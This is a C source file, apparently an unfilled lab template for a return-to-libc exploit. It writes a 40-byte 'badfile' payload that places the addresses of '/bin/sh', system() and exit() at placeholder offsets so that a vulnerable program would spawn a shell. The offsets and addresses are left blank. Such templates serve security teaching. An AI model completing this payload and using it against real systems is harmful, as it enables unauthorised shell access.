/* exploit.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define SHELL_LOC 
#define SYSTEM_LOC
#define EXIT_LOC
int main(int argc, char **argv)
{
	char buf[40];
	FILE *badfile;
	badfile = fopen("./badfile", "w");
	*(long *) &buf[X] = some address ; // "/bin/sh" ✰
	*(long *) &buf[Y] = some address ; // system() ✰
	*(long *) &buf[Z] = some address ; // exit() ✰
	fwrite(buf, sizeof(buf), 1, badfile);
	fclose(badfile);
}
